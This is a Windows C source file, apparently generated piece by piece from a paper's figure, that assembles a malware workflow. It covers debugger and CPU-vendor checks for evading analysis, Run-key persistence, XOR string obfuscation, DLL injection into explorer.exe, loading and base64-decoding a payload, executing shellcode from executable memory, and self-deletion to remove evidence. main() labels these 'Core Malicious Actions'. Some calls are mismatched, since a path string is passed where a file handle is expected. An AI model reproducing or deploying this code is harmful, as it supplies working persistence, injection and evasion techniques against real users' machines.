
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include <intrin.h>


#include <windows.h>

BOOL Debugger_Identification() {
    // 1. Check using IsDebuggerPresent()
    if (IsDebuggerPresent()) {
        return TRUE;
    }

    // 2. Check using CheckRemoteDebuggerPresent()
    BOOL bRemoteDebuggerPresent = FALSE;
    HANDLE hCurrentProcess = GetCurrentProcess();

    // Check if CheckRemoteDebuggerPresent succeeds and indicates a debugger
    if (CheckRemoteDebuggerPresent(hCurrentProcess, &bRemoteDebuggerPresent)) {
        if (bRemoteDebuggerPresent) {
            return TRUE;
        }
    }
    // Note: If CheckRemoteDebuggerPresent fails, it returns FALSE,
    // and bRemoteDebuggerPresent might not be reliably updated or might indicate no debugger.
    // In either case, if it fails or returns FALSE for bRemoteDebuggerPresent,
    // we proceed assuming no remote debugger was detected by this method.

    // No debugger identified by either method
    return FALSE;
}

#include <windows.h> // For BOOL, TRUE, FALSE
#include <string.h>  // For strcmp

BOOL CPU_Identification() {
    unsigned int eax, ebx, ecx, edx;
    char vendor_id[13]; // "GenuineIntel" + null terminator

    // Execute CPUID instruction with EAX=0 to get vendor ID
    __asm__ volatile (
        "cpuid"
        : "=a" (eax), // Output EAX value to 'eax' variable
          "=b" (ebx), // Output EBX value to 'ebx' variable
          "=c" (ecx), // Output ECX value to 'ecx' variable
          "=d" (edx)  // Output EDX value to 'edx' variable
        : "a" (0)     // Input EAX value is 0 (for vendor string)
    );

    // The vendor ID string is "GenuineIntel" stored in EBX, EDX, ECX
    // EBX contains bytes 0-3
    // EDX contains bytes 4-7
    // ECX contains bytes 8-11
    
    // Copy bytes from EBX (first 4 characters)
    vendor_id[0] = (char)(ebx & 0xFF);
    vendor_id[1] = (char)((ebx >> 8) & 0xFF);
    vendor_id[2] = (char)((ebx >> 16) & 0xFF);
    vendor_id[3] = (char)((ebx >> 24) & 0xFF);

    // Copy bytes from EDX (next 4 characters)
    vendor_id[4] = (char)(edx & 0xFF);
    vendor_id[5] = (char)((edx >> 8) & 0xFF);
    vendor_id[6] = (char)((edx >> 16) & 0xFF);
    vendor_id[7] = (char)((edx >> 24) & 0xFF);

    // Copy bytes from ECX (last 4 characters)
    vendor_id[8] = (char)(ecx & 0xFF);
    vendor_id[9] = (char)((ecx >> 8) & 0xFF);
    vendor_id[10] = (char)((ecx >> 16) & 0xFF);
    vendor_id[11] = (char)((ecx >> 24) & 0xFF);

    vendor_id[12] = '\0'; // Null-terminate the string

    // Compare the retrieved vendor ID with "GenuineIntel"
    if (strcmp(vendor_id, "GenuineIntel") == 0) {
        return TRUE; // Running on an Intel CPU
    } else {
        return FALSE; // Not running on an Intel CPU
    }
}

#include <windows.h>
#include <string.h> // Required for wcslen

void AutoRun() {
    WCHAR szPath[MAX_PATH];
    DWORD dwRet = GetModuleFileNameW(NULL, szPath, MAX_PATH);

    if (dwRet == 0 || dwRet >= MAX_PATH) {
        // Failed to get executable path or buffer too small
        return;
    }

    HKEY hKey;
    LONG lResult = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE, // Required access for setting a value
        &hKey
    );

    // If the key could not be opened for writing, try creating it with write access.
    // This handles cases where the key might not exist (though "Run" typically does).
    if (lResult != ERROR_SUCCESS) {
        lResult = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            KEY_SET_VALUE, // Ensure write access for the key
            NULL,
            &hKey,
            NULL
        );
    }
    
    if (lResult == ERROR_SUCCESS) {
        // Define a unique name for your application's Autorun entry.
        // It's good practice to make this name specific to your application.
        LPCWSTR pszValueName = L"MyApplicationAutoRun";

        // Set the registry value.
        // The data is the full path to the executable.
        lResult = RegSetValueExW(
            hKey,
            pszValueName,
            0,
            REG_SZ,
            (const BYTE*)szPath, // Cast to const BYTE* as required by the API
            (wcslen(szPath) + 1) * sizeof(WCHAR) // Size in bytes, including the null terminator
        );

        RegCloseKey(hKey); // Always close the registry key handle
    }
    // No explicit error handling requested beyond the function scope for RegSetValueExW failure.
}

#include <string.h>

void String_XOR(char *string, char *key) {
    if (string == NULL || key == NULL) {
        return;
    }

    size_t string_len = strlen(string);
    size_t key_len = strlen(key);

    if (key_len == 0) {
        return; // Cannot XOR with an empty key
    }

    for (size_t i = 0; i < string_len; i++) {
        string[i] ^= key[i % key_len];
    }
}

#include <windows.h>
#include <string.h>   // For strlen and strcmp
#include <tlhelp32.h> // For CreateToolhelp32Snapshot and related functions

// Function to inject a DLL into a specified process
void DLL_Injection(char *dll, char *process) {
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    HANDLE hProcess = NULL;
    LPVOID remoteAllocatedMemory = NULL;
    HANDLE hRemoteThread = NULL;

    // 1. Find the target process ID (PID)
    // Create a snapshot of all running processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        // Error: Could not create process snapshot.
        return;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process, and exit if unsuccessful
    if (!Process32First(hSnapshot, &pe32)) {
        // Error: Could not retrieve first process information.
        CloseHandle(hSnapshot);
        return;
    }

    // Iterate through all processes to find the target by name
    do {
        // Compare the executable file name (ANSI)
        if (strcmp(pe32.szExeFile, process) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    // Close the snapshot handle as it's no longer needed
    CloseHandle(hSnapshot);

    if (pid == 0) {
        // Error: Target process not found.
        return;
    }

    // 2. Open the target process
    // Request necessary permissions: PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (hProcess == NULL) {
        // Error: Could not open target process. (e.g., insufficient permissions)
        return;
    }

    // 3. Allocate memory in the target process for the DLL path string
    size_t dllPathLen = strlen(dll) + 1; // +1 for the null terminator
    remoteAllocatedMemory = VirtualAllocEx(hProcess, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteAllocatedMemory == NULL) {
        // Error: Could not allocate memory in the remote process.
        CloseHandle(hProcess);
        return;
    }

    // 4. Write the DLL path string into the allocated memory
    if (!WriteProcessMemory(hProcess, remoteAllocatedMemory, dll, dllPathLen, NULL)) {
        // Error: Could not write the DLL path into remote process memory.
        VirtualFreeEx(hProcess, remoteAllocatedMemory, 0, MEM_RELEASE); // Free allocated memory
        CloseHandle(hProcess);
        return;
    }

    // 5. Get the address of LoadLibraryA in kernel32.dll
    // LoadLibraryA is used because the DLL path is an ANSI string (char*).
    // GetModuleHandleA retrieves a handle to kernel32.dll which is loaded in every process.
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        // Error: Could not get handle to kernel32.dll. (Highly unlikely unless system is critically broken)
        VirtualFreeEx(hProcess, remoteAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Get the address of the LoadLibraryA function within kernel32.dll.
    // This address is the same across all processes.
    LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryA == NULL) {
        // Error: Could not get address of LoadLibraryA function.
        VirtualFreeEx(hProcess, remoteAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // 6. Create a remote thread in the target process
    // The thread will execute LoadLibraryA with the remote DLL path as its argument.
    hRemoteThread = CreateRemoteThread(hProcess, // Handle to the target process
                                       NULL,     // Default security attributes
                                       0,        // Default stack size
                                       pLoadLibraryA, // Start address (LoadLibraryA)
                                       remoteAllocatedMemory, // Argument to LoadLibraryA (DLL path)
                                       0,        // Creation flags (run immediately)
                                       NULL);    // Don't need thread ID
    if (hRemoteThread == NULL) {
        // Error: Could not create remote thread.
        VirtualFreeEx(hProcess, remoteAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // 7. Wait for the remote thread to finish execution (optional but good practice)
    // This ensures LoadLibraryA has completed loading the DLL.
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Clean up resources
    CloseHandle(hRemoteThread);

    // Free the memory allocated in the remote process for the DLL path.
    // This is safe to do after LoadLibraryA has finished.
    VirtualFreeEx(hProcess, remoteAllocatedMemory, 0, MEM_RELEASE);

    CloseHandle(hProcess);
}

#include <windows.h> // Required for Windows API functions like GetFileSizeEx, ReadFile, and HANDLE type.

// Function prototype: int Load_From_File(void *file, void *buffer);
// Loads the entire content of a file into a pre-allocated buffer.
// Parameters:
//   file: A void pointer representing an open file handle (should be castable to HANDLE).
//   buffer: A void pointer to the pre-allocated buffer where file content will be loaded.
// Returns:
//   The number of bytes successfully loaded into the buffer, or 0 if an error occurs
//   (e.g., failed to get file size, file is too large for 'int' return type,
//   or failed to read file content).
int Load_From_File(void *file, void *buffer) {
    HANDLE hFile = (HANDLE)file;
    LARGE_INTEGER fileSize;
    DWORD bytesRead = 0; // Will store the actual number of bytes read by ReadFile

    // 1. Get the size of the file.
    // GetFileSizeEx is used for 64-bit file sizes.
    if (!GetFileSizeEx(hFile, &fileSize)) {
        // Failed to get file size. Return 0 to indicate an error or no bytes loaded.
        return 0;
    }

    // 2. Check if the file size can be represented by the 'int' return type
    // and if it's within the limit for a single ReadFile operation (DWORD).
    // INT_MAX is typically 2,147,483,647 bytes (2 GB).
    // A single ReadFile call's third argument (nNumberOfBytesToRead) is DWORD,
    // which is also typically 32-bit (MAXDWORD is 4,294,967,295 bytes or 4 GB).
    // If the file is larger than INT_MAX, we cannot accurately return its full size.
    // If it's larger than MAXDWORD, a single ReadFile call might not work,
    // but INT_MAX is smaller than MAXDWORD, so checking against INT_MAX is sufficient
    // for both the return value and the ReadFile parameter in this context.
    if (fileSize.QuadPart > (LONGLONG)0x7FFFFFFF) { // 0x7FFFFFFF represents INT_MAX
        // The file is too large to return its full size as an 'int'.
        // Return 0 to indicate that the file could not be fully loaded or processed.
        return 0;
    }

    // 3. The file size fits within a DWORD and within the 'int' return type.
    // Cast the 64-bit file size to a 32-bit DWORD for ReadFile's third parameter.
    DWORD bytesToRead = (DWORD)fileSize.QuadPart;

    // 4. Read the file content into the provided buffer.
    // The last parameter (lpOverlapped) is NULL for synchronous I/O.
    if (!ReadFile(hFile, buffer, bytesToRead, &bytesRead, NULL)) {
        // Failed to read the file content. Return 0 to indicate an error or no bytes loaded.
        return 0;
    }

    // 5. Return the total number of bytes successfully read.
    // Cast the DWORD bytesRead to int as per the function prototype.
    return (int)bytesRead;
}

#include <windows.h>
#include <wincrypt.h>

int Decode_Base64(void *encoded, int size, void *decoded) {
    DWORD dwDecodedSize = 0;
    BOOL bResult;

    // Step 1: Determine the required buffer size for the decoded data.
    // Call CryptStringToBinaryA with a NULL output buffer.
    bResult = CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the base64 encoded string
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag for Base64 decoding
        NULL,                   // Output buffer (NULL to get size)
        &dwDecodedSize,         // Pointer to receive the required size
        NULL,                   // Reserved, must be NULL
        NULL                    // Reserved, must be NULL
    );

    if (!bResult) {
        // An error occurred (e.g., invalid base64 string format).
        // Return 0 to indicate failure.
        return 0;
    }

    // Step 2: Perform the actual decoding into the provided buffer.
    // Use the determined size (dwDecodedSize) which will be updated
    // with the actual number of bytes written.
    bResult = CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the base64 encoded string
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag for Base64 decoding
        (PBYTE)decoded,         // Output buffer for decoded data
        &dwDecodedSize,         // Pointer to the actual size of the decoded data
        NULL,                   // Reserved, must be NULL
        NULL                    // Reserved, must be NULL
    );

    if (!bResult) {
        // An error occurred during decoding.
        // Return 0 to indicate failure.
        return 0;
    }

    // Return the size of the successfully decoded data.
    return (int)dwDecodedSize;
}

#include <windows.h>
#include <string.h>

void Run_From_Memory(void *shellcode, int size) {
    LPVOID allocated_memory;
    HANDLE thread_handle;

    // Allocate memory with read, write, and execute permissions
    allocated_memory = VirtualAlloc(
        NULL,           // System determines where to allocate the region
        size,           // Size of the region
        MEM_COMMIT | MEM_RESERVE, // Allocate and reserve memory
        PAGE_EXECUTE_READWRITE    // Memory protection: Execute, Read, Write
    );

    if (allocated_memory == NULL) {
        // Failed to allocate memory
        return;
    }

    // Copy the shellcode into the allocated memory
    memcpy(allocated_memory, shellcode, size);

    // Create a new thread to execute the shellcode
    thread_handle = CreateThread(
        NULL,           // Default security attributes
        0,              // Default stack size
        (LPTHREAD_START_ROUTINE)allocated_memory, // Thread start address (shellcode entry point)
        NULL,           // No parameter to pass to the thread
        0,              // Creation flags (0 = run immediately)
        NULL            // Don't care about the thread ID
    );

    if (thread_handle == NULL) {
        // Failed to create thread, free allocated memory
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        return;
    }

    // Close the thread handle. The shellcode will continue to execute in its own thread.
    // If the caller needs to wait for the shellcode to finish,
    // they would typically use WaitForSingleObject on the handle before closing.
    CloseHandle(thread_handle);
}

#include <windows.h>

void Delete_File(char *filename) {
    DeleteFileA(filename);
}

#include <windows.h>
#include <stdio.h> // For _snwprintf_s
#include <wchar.h> // For wcsrchr, wcscpy_s, wcslen

void Delete_Itself() {
    WCHAR szPath[MAX_PATH];
    WCHAR szTempDir[MAX_PATH];
    WCHAR szTempBatchPath[MAX_PATH];
    WCHAR szBatchContent[MAX_PATH * 2]; // Buffer for the batch file content
    HANDLE hFile;
    DWORD dwBytesWritten;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    // 1. Get the full path to the current executable file.
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH) == 0) {
        // Failed to get executable path. Cannot proceed with self-deletion.
        return;
    }

    // 2. Get the path to the system's temporary directory.
    if (GetTempPathW(MAX_PATH, szTempDir) == 0) {
        // Failed to get temporary directory.
        return;
    }

    // 3. Create a unique temporary file name for our batch script.
    // The name will be like "C:\TEMP\delxxxx.tmp".
    if (GetTempFileNameW(szTempDir, L"del", 0, szTempBatchPath) == 0) {
        // Failed to create temporary file name.
        return;
    }

    // Change the extension from .tmp to .bat so ShellExecute or CreateProcess
    // recognizes it as a batch file.
    WCHAR* dot = wcsrchr(szTempBatchPath, L'.');
    if (dot) {
        wcscpy_s(dot, MAX_PATH - (dot - szTempBatchPath), L".bat");
    } else {
        // Fallback if no dot found (should not happen with GetTempFileNameW)
        wcscat_s(szTempBatchPath, MAX_PATH, L".bat");
    }

    // 4. Create the batch file.
    hFile = CreateFileW(szTempBatchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // Failed to create the batch file.
        return;
    }

    // The batch file content:
    // @echo off
    // timeout /t 3 /nobreak > nul  -- Wait for 3 seconds to allow the parent process to exit
    // del "C:\path\to\original\executable.exe"
    // del "C:\path\to\this\batchfile.bat"
    _snwprintf_s(szBatchContent, MAX_PATH * 2, _TRUNCATE,
                 L"@echo off\r\n"
                 L"timeout /t 3 /nobreak > nul\r\n" // Wait for parent process to exit
                 L"del \"%s\"\r\n"                  // Delete the original executable
                 L"del \"%s\"\r\n",                 // Delete the batch file itself
                 szPath, szTempBatchPath);

    // Write the batch file content.
    // The string length is multiplied by sizeof(WCHAR) because WriteFile expects byte count.
    if (!WriteFile(hFile, szBatchContent, wcslen(szBatchContent) * sizeof(WCHAR), &dwBytesWritten, NULL)) {
        CloseHandle(hFile);
        // Failed to write to batch file. Try to clean up.
        DeleteFileW(szTempBatchPath);
        return;
    }

    CloseHandle(hFile); // Close the handle to the batch file

    // 5. Execute the batch file.
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Construct the command line for cmd.exe to execute the batch file.
    // cmd.exe /c executes the command and then terminates.
    WCHAR szCmdLine[MAX_PATH + 100]; // Buffer for cmd.exe /c ...
    _snwprintf_s(szCmdLine, MAX_PATH + 100, _TRUNCATE, L"cmd.exe /c \"%s\"", szTempBatchPath);

    if (!CreateProcessW(NULL,               // No module name (use command line)
                       szCmdLine,          // Command line
                       NULL,               // Process handle not inheritable
                       NULL,               // Thread handle not inheritable
                       FALSE,              // Set handle inheritance to FALSE
                       CREATE_NO_WINDOW,   // Do not create a console window
                       NULL,               // Use parent's environment block
                       NULL,               // Use parent's starting directory
                       &si,                // Pointer to STARTUPINFO structure
                       &pi)                // Pointer to PROCESS_INFORMATION structure
    ) {
        // If CreateProcess fails, the batch file wasn't launched.
        // Try deleting the batch file as it's no longer needed (and failed to launch).
        DeleteFileW(szTempBatchPath);
        return;
    }

    // Close the handles for the newly created process and its primary thread.
    // We don't need to wait for it, as it will outlive us to delete our executable.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // 6. Exit the current process. This is crucial as it releases the lock on
    // the executable file, allowing the batch script to delete it.
    ExitProcess(0); // The function will not return from this point.
}


#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function Prototypes (must match generated blocks)
BOOL Debugger_Identification();
BOOL CPU_Identification();
void AutoRun();
void String_XOR(char *string, char *key);
void DLL_Injection(char *dll, char *process);
int Load_From_File(void *file, void *buffer);
int Decode_Base64(void *encoded, int size, void *decoded);
void Run_From_Memory(void *shellcode, int size);
void Delete_File(char *filename);
void Delete_Itself();


int main() {
    // --- 1. Defense Evasion Checks ---
    
    // Check 1: Debugger Identification (Figure 6: Start -> Debugger Identification)
    printf("[*] Running Debugger Check...\n");
    if (Debugger_Identification()) {
        printf("[!] Debugger detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Debugger NOT detected. Continuing.\n");

    // Check 2: CPU Identification (Figure 6: Debugger Identification -> CPUID Check)
    printf("[*] Running CPU Identification Check (Intel target)...\n");
    if (!CPU_Identification()) {
        printf("[!] Target CPU NOT detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Target CPU detected. Continuing execution.\n");


    // --- 2. Core Malicious Actions ---
    
    // Action 1: Persistence (Figure 6: CPUID Check -> Set AutoRun)
    printf("[*] Setting Persistence (AutoRun)...\n");
    AutoRun();

    // Setup: XOR strings and buffers (for simplicity, we use hardcoded paths/names)
    char dll_name[] = "KERNEL32.DLL"; 
    char dll_key[] = "abc";
    char process_name[] = "explorer.exe";

    // Action 2: String XOR (Figure 6: Set AutoRun -> XOR String)
    printf("[*] XOR-ing DLL name string...\n");
    String_XOR(dll_name, dll_key);
    
    // Action 3: DLL Injection (Figure 6: XOR String -> Inject DLL)
    // NOTE: We XOR back here so DLL_Injection gets the plaintext name.
    String_XOR(dll_name, dll_key); 
    printf("[*] Injecting DLL into process: %s\n", process_name);
    DLL_Injection(dll_name, process_name);
    String_XOR(dll_name, dll_key); // Re-XOR for stealth

    // Action 4: Load and Decode Payload
    char file_path[] = "C:\\path\\to\\payload.b64";
    char payload_buffer[1024] = {0};
    unsigned char decoded_shellcode[1024] = {0};
    int n_read, n_decoded;

    // Load file (Figure 6: Load File)
    printf("[*] Loading payload from file: %s\n", file_path);
    n_read = Load_From_File(file_path, payload_buffer);
    
    // Decode Base64 (Figure 6: Decode Base64)
    printf("[*] Decoding Base64 payload (Size: %d)...\n", n_read);
    n_decoded = Decode_Base64(payload_buffer, n_read, decoded_shellcode);
    
    // Action 5: Execute Payload (Figure 6: Run Memory)
    if (n_decoded > 0) {
        printf("[*] Running shellcode from memory (Size: %d)...\n", n_decoded);
        Run_From_Memory(decoded_shellcode, n_decoded);
        printf("[+] Shellcode execution initiated.\n");
    } else {
        printf("[!] Payload decoding failed. Exiting.\n");
    }

    // --- 3. Normal Exit ---
    printf("[✔] Malicious workflow complete. Exiting normally.\n");
    return 0;


    // --- 4. Evasion and Exit Routine (Figure 6: Delete File -> Delete Itself -> Exit) ---
    EVASION_ROUTINE:
    
    // Action 6: Delete associated library file
    printf("[*] Deleting associated file: %s\n", dll_name);
    Delete_File(dll_name);
    
    // Action 7: Delete own executable
    printf("[*] Deleting self (Evidence removal)...\n");
    Delete_Itself();

    printf("[!] Evasion complete. Exiting.\n");
    return -1;
}
